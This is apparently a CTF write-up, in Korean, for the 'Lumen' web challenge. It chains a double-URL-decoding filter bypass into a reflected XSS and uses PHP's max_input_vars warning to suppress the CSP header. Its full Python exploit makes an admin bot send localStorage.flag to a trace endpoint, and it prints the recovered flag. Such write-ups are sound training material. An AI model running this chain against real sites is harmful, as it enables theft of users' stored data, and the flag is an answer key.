---
title: "Lumen"
ctf: "BlackHat MEA Qualification CTF 2026"
date: 2026-09-05
category: web
difficulty: easy
points: 100
flag_format: "BHFlagY{...}"
author: "TOROOT@SEC"
---

# Lumen

## Summary

분리된 경로 조각과 이중 URL 디코딩을 이용해 `<img onerror>`를 반사시킨다. 이어서 PHP의 `max_input_vars` 경고를 응답 본문에 먼저 출력시켜 CSP 헤더 전송을 실패하게 만들고, 운영자 봇의 `localStorage.flag`를 같은 출처의 trace 엔드포인트로 전달한다.

## Solution

### Step 1: 이중 디코딩으로 HTML 주입

`clean()`은 `dir`와 `file`을 각각 검사한 뒤 두 값을 연결하고 다시 `urldecode()`한다. 따라서 요청에서 `dir=%253`, `file=cimg...`를 보내면 PHP의 쿼리 디코딩 후 두 값은 각각 `%3`, `cimg...`가 된다. 어느 조각에도 금지 문자열 `%3c`는 없지만 연결 후 `%3cimg...`가 되고, 명시적인 두 번째 디코딩에서 `<img...>`가 된다.

### Step 2: 시작 경고로 CSP 헤더 제거

컨테이너는 다음 옵션으로 PHP를 실행한다.

```text
display_errors=1
output_buffering=0
max_input_vars=1000
```

중요한 `p`, `dir`, `file`을 먼저 배치하고 짧은 `&x` 변수를 1,001개 덧붙이면 요청 시작 단계에서 `Input variables exceeded 1000` 경고가 본문에 출력된다. 버퍼링이 꺼져 있으므로 이후 `header("Content-Security-Policy: ...")`는 `headers already sent`로 실패한다. PHP 문서도 제한 초과 시 `E_WARNING`과 후속 변수 절단이 발생하며, 출력이 시작된 후에는 `header()`로 헤더를 추가할 수 없다고 명시한다.

응답 헤더 확인 결과에도 CSP가 없고 본문 앞에는 다음 경고가 나타났다.

```text
PHP Request Startup: Input variables exceeded 1000.
Cannot modify header information - headers already sent
```

참고: [PHP `max_input_vars` 문서](https://www.php.net/manual/en/info.configuration.php#ini.max-input-vars), [PHP `headers_sent()` 문서](https://www.php.net/manual/en/function.headers-sent.php)

### Step 3: 운영자 봇에서 플래그 회수

CSP가 사라진 페이지에서 이미지 로드 실패가 `onerror`를 실행한다. 스크립트는 봇이 미리 저장한 `localStorage.flag`를 `/?p=trace&id=...&note=...`로 전달한다. 아래 스크립트는 보고 등록부터 trace 폴링까지 한 번에 수행한다.

```python
import html
import re
import secrets
import time
from urllib.parse import urlencode
from urllib.request import Request, urlopen

BASE = "http://k84e2c92879e2e11c9a50a9313232ca0e.playat.flagyard.com"
FLAG = re.compile(r"BHFlagY\{[^}\r\n]+\}")
trace_id = "LUMEN" + secrets.token_hex(6).upper()

def delayed_decode(value):
    for old, new in [
        ("%", "%25"), ("+", "%2b"), ("&", "%26"),
        ('"', "%22"), ("'", "%27"), (">", "%3e"),
    ]:
        value = value.replace(old, new)
    return value

js = (
    f"location='/?p=trace\\x26id={trace_id}\\x26note='+"
    "encodeURIComponent(localStorage.flag)"
)
tag = f'img src=x onerror="{js}">'
query = urlencode({
    "p": "view",
    "dir": "%3",
    "file": "c" + delayed_decode(tag),
})
payload_url = f"{BASE}/?{query}" + "&x" * 1001

body = urlencode({"url": payload_url}).encode()
urlopen(Request(f"{BASE}/?p=report", data=body), timeout=10).read()

trace_url = f"{BASE}/?" + urlencode({"p": "trace", "id": trace_id})
for _ in range(40):
    response = html.unescape(urlopen(trace_url, timeout=10).read().decode())
    if match := FLAG.search(response):
        print(match.group(0))
        break
    time.sleep(0.4)
else:
    raise TimeoutError("operator did not deliver the flag")
```

실행 결과:

```text
BHFlagY{55a16ae096ae9c534c1ccf5b02cfef9f}
```

## Flag

```text
BHFlagY{55a16ae096ae9c534c1ccf5b02cfef9f}
```
